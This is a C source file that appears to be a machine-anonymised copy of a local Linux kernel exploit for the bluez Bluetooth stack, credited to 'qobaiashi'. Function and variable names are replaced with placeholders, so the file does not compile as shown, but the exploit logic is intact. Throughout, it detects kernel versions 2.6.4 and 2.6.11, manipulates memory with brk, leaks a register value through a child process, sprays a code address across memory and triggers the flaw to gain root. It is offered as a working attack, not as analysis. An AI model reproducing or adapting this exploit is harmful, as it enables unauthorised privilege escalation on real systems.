
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct utsname {char* release; } ;


 int VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (void*) ;
 int FUNC_1 (int) ;
 scalar_t__ FUNC_2 () ;
 char* VAR_3 ;
 char* VAR_4 ;
 int FUNC_3 (int,char*,int) ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (int ,int ,unsigned int) ;
 char* FUNC_6 (char*,char*) ;
 unsigned int FUNC_7 (char*,int ,int ) ;
 scalar_t__ FUNC_8 (struct utsname*) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int) ;

FUNC_11(int VAR_5, char *VAR_6[])
{
char VAR_7[2048];
int VAR_8, *VAR_9 = (int*)VAR_7;
unsigned int VAR_10;
int VAR_11;
char *VAR_12, *VAR_13 = 0;
struct utsname VAR_14;

FUNC_4("-|-local bluez exploit v.0.3  -by qobaiashi-\n |\n");
if (FUNC_8(&VAR_14) < 0)
   FUNC_4(" |- couldn't determine kernel version\n");

else
   {
    FUNC_4(" |- i've found kernel %s\n", VAR_14.release);
    if(FUNC_6(VAR_14.release, "2.6.11") > 0) VAR_13 = VAR_4;
    if(FUNC_6(VAR_14.release, "2.6.4") > 0) VAR_13 = VAR_3;
   }

if (VAR_13 == 0)
   {
    FUNC_4(" |- no supported version found..trying 2.6.4 code\n");
    VAR_13 = VAR_3;
    }


if( FUNC_0((void*)VAR_1) == -1 )
  {
    FUNC_4(" |- brk failed..exiting\n");
    FUNC_1(1);
   }


if (VAR_5 < 2)
   {
    FUNC_9(VAR_6[0]);
    FUNC_1(1);
    }

if (VAR_5 == 2)
    VAR_10 = FUNC_7(VAR_6[1], 0, 0);

if (VAR_5 == 3)
   {
    VAR_10 = FUNC_7(VAR_6[1], 0, 0);
    VAR_9 = (unsigned int*)FUNC_7(VAR_6[2], 0, 0);
   }

if (FUNC_2() != 0)
   {

   FUNC_10(100);
   if ((VAR_11 = FUNC_3(0x3, VAR_7, 1700)) > -1)
       {
        VAR_12 = FUNC_6(VAR_7, "ecx: ");
        FUNC_4(" |- [%0.14s]\n", VAR_12);
        if (*(VAR_12+5) == 0x30 && *(VAR_12+6) == 0x38)
           {
           VAR_12+=5;
           FUNC_4(" |- suitable value found!using 0x%0.9s\n", VAR_12);
           FUNC_4(" |- the time has come to push the button... check your id!\n");
           *(VAR_12+9) = 0x00;*(--VAR_12) = 'x';*(--VAR_12) = '0';
           VAR_9 = (unsigned int*)FUNC_7(VAR_12, 0, 0);
           for (VAR_8 = 0;VAR_8 <= 200;VAR_8++)
                *(VAR_9++) = (int)VAR_13;

            if ((VAR_8 = FUNC_5(VAR_0, VAR_2, VAR_10)) < 0)
               {
                FUNC_4(" |- something went w0rng (invalid value)\n");
                FUNC_1(1);
               }

           }
        }
   return 0;
   }

if (FUNC_2() == 0)
{
  for (VAR_8 = 0;VAR_8 <= 200;VAR_8++)
     *(VAR_9++) = (int)VAR_13;

  FUNC_4(" |- trying...\n");
  if ((VAR_8 = FUNC_5(VAR_0, VAR_2, VAR_10)) < 0)
      {
      FUNC_4(" |- something went w0rng (invalid value)\n");
      FUNC_1(1);
     }
}

FUNC_1(0);
}
